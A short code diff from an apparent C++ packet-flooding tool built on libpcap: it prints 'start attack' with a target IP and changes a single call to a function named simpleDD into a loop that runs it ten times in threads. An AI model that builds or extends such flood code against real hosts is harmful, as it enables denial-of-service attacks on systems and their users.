@@ -135,8 +135,13 @@ int main(int args,char* argv[])
 
 	std::cout << "开始攻击\n" << ip << "\n";
 
-	simpleDD(ip, dd->name);
-
+	//simpleDD(ip, dd->name);
+	for (int i = 0; i < 10; i++)
+	{
+		std::thread t(simpleDD, ip, dd->name);
+		t.join();
+	}
+	
 	/* 不再需要设备列表了，释放它 */
 	pcap_freealldevs(alldevs);
 	system("pause");
